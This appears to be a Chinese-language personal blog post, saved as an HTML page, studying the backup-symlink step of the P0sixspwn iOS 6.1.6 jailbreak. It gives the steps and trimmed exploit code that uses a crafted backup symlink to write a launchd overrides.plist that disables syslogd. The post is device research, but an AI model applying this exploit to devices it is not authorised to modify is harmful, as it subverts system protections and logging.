@@ -1,0 +1,234 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+	<h1>
+    <a href="/" id="title"></a>
+	</h1>
+	</div>
+<div id="md" style="display: none;">
+<!-- markdown -->
+##P0sixspwn(1)  
+
+正巧看到了P0sixspwn的源码，便入手了一部iPod Touch 4， 6.1.6系统， 可以用来研究一下。  
+
+第一步是利用了backup的一个漏洞，简单来说就是，先对idevice做backup，对backup下来的目录进行解密，写入一个符号链接，指向iOS设备上正常手段不能访问的目录，然后通过这个符号链接插入文件，在store回去的时候，就可以在不能访问的目录里面写入文件的目的； 
+
+基本的实验步骤如下：  
+1. 编译、安装libimobiledevice  
+2. idevicebackup2 backup  
+3. 修改P0sixspwn的源码configure.ac， 去掉其中的GUI部分，利用automake生成新的makefile  
+4. 修改src目录下的jailbreak.c， 只保留backup exploit的部分  
+5. make生成可执行程序，执行  
+6. 将backup的记录，使用idevicebackup2 unback解密，可以看到其中有我们插入的文件  
+7.  idevicebackup2 store
+
+####一些点：  
+
+*   生成目录、软链接目录的过程实际上没有生成对应的sha1加密的文件名文件，而只是在修改了Manifest.mbdb里面的记录，这个文件实际代表了backup文件里的所有目录结构
+  
+*   很容易能搜索到mbdb文件的解密的代码，这个文件的结构其实很简单，一个mbdb头，后面便是key-Vaule这种结构的data，当然data里面并没有存储key的信息； 具体结构可以在iphoneWiki中查到；  
+
+*   mbdb的k-v结构中，有一个key叫做LinkTarget，看了下插入symlink的代码，实际上就是在设置这个字段，也直接导致了后续的漏洞利用，还没有想明白为什么苹果在这里要加一个字段，也许备份文件本身里面也有软链接？  
+
+
+####jailbreak.c: 
+	
+	int main() {
+
+    printf("\n\n\nhello world!\n");
+    backup_t *backup;  
+    backup = backup_open("../..", "xxxxxxxxxxxx_myuuid_xxxx");        //arg1: back_up Path, arg2: uuid;
+    
+    if (!backup) {
+        printf("failed to open backup\n");
+    }
+
+    if (backup_mkdir(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501, 4) != 0) {
+        printf("Could not make folder!\n");
+    }
+
+    if (backup_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", "/var/db/launchd.db/com.apple.launchd", 501, 501, 4) != 0) {
+        printf("Failed to symlink var!\n");
+    }
+
+    char* overrides_plist = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
+    "<plist version=\"1.0\">\n"
+    "<dict>\n"
+    "    <key>com.apple.syslogd</key>\n"
+    "    <dict>\n"
+    "        <key>Disabled</key>\n"
+    "        <true/>\n"
+    "    </dict>\n"
+    "</dict>\n"
+    "</plist>\n";
+    FILE *f = fopen("../payload/common/overrides.plist", "wb+");
+    fwrite(overrides_plist, sizeof(overrides_plist), 1, f);
+    fclose(f);
+    if (backup_add_file_from_path(backup, "MediaDomain", "../payload/common/overrides.plist", "Media/Recordings/.haxx/overrides.plist", 0100755, 0, 0, 4) != 0) {
+        printf("Could not add tar\n");
+    }
+
+    return 0;
+    }
+    
+从代码来看，最终的作用是关闭了syslogd这个服务，目前还不知道关闭这个东西有什么用。。。印象中在iOS 8的系统中，默认已经没有了syslogd。
+<!-- markdown end -->
+</div>
+<div class="entry" id="main">
+<!-- content -->
+<h2 id="p0sixspwn1">P0sixspwn(1)</h2>
+
+<p>正巧看到了P0sixspwn的源码，便入手了一部iPod Touch 4， 6.1.6系统， 可以用来研究一下。  </p>
+
+<p>第一步是利用了backup的一个漏洞，简单来说就是，先对idevice做backup，对backup下来的目录进行解密，写入一个符号链接，指向iOS设备上正常手段不能访问的目录，然后通过这个符号链接插入文件，在store回去的时候，就可以在不能访问的目录里面写入文件的目的； </p>
+
+<p>基本的实验步骤如下： <br>
+1. 编译、安装libimobiledevice <br>
+2. idevicebackup2 backup <br>
+3. 修改P0sixspwn的源码configure.ac， 去掉其中的GUI部分，利用automake生成新的makefile <br>
+4. 修改src目录下的jailbreak.c， 只保留backup exploit的部分 <br>
+5. make生成可执行程序，执行 <br>
+6. 将backup的记录，使用idevicebackup2 unback解密，可以看到其中有我们插入的文件 <br>
+7.  idevicebackup2 store</p>
+
+<h4 id="">一些点：</h4>
+
+<ul>
+<li><p>生成目录、软链接目录的过程实际上没有生成对应的sha1加密的文件名文件，而只是在修改了Manifest.mbdb里面的记录，这个文件实际代表了backup文件里的所有目录结构</p></li>
+<li><p>很容易能搜索到mbdb文件的解密的代码，这个文件的结构其实很简单，一个mbdb头，后面便是key-Vaule这种结构的data，当然data里面并没有存储key的信息； 具体结构可以在iphoneWiki中查到；  </p></li>
+<li><p>mbdb的k-v结构中，有一个key叫做LinkTarget，看了下插入symlink的代码，实际上就是在设置这个字段，也直接导致了后续的漏洞利用，还没有想明白为什么苹果在这里要加一个字段，也许备份文件本身里面也有软链接？  </p></li>
+</ul>
+
+<h4 id="jailbreakc">jailbreak.c:</h4>
+
+<pre><code>int main() {
+
+printf("\n\n\nhello world!\n");
+backup_t *backup;  
+backup = backup_open("../..", "xxxxxxxxxxxx_myuuid_xxxx");        //arg1: back_up Path, arg2: uuid;
+
+if (!backup) {
+    printf("failed to open backup\n");
+}
+
+if (backup_mkdir(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501, 4) != 0) {
+    printf("Could not make folder!\n");
+}
+
+if (backup_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", "/var/db/launchd.db/com.apple.launchd", 501, 501, 4) != 0) {
+    printf("Failed to symlink var!\n");
+}
+
+char* overrides_plist = "&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n"
+"&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n"
+"&lt;plist version=\"1.0\"&gt;\n"
+"&lt;dict&gt;\n"
+"    &lt;key&gt;com.apple.syslogd&lt;/key&gt;\n"
+"    &lt;dict&gt;\n"
+"        &lt;key&gt;Disabled&lt;/key&gt;\n"
+"        &lt;true/&gt;\n"
+"    &lt;/dict&gt;\n"
+"&lt;/dict&gt;\n"
+"&lt;/plist&gt;\n";
+FILE *f = fopen("../payload/common/overrides.plist", "wb+");
+fwrite(overrides_plist, sizeof(overrides_plist), 1, f);
+fclose(f);
+if (backup_add_file_from_path(backup, "MediaDomain", "../payload/common/overrides.plist", "Media/Recordings/.haxx/overrides.plist", 0100755, 0, 0, 4) != 0) {
+    printf("Could not add tar\n");
+}
+
+return 0;
+}
+</code></pre>
+
+<p>从代码来看，最终的作用是关闭了syslogd这个服务，目前还不知道关闭这个东西有什么用。。。印象中在iOS 8的系统中，默认已经没有了syslogd。</p>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2014 by isnowfy, Designed by isnowfy</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "P0sixspwn_1.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
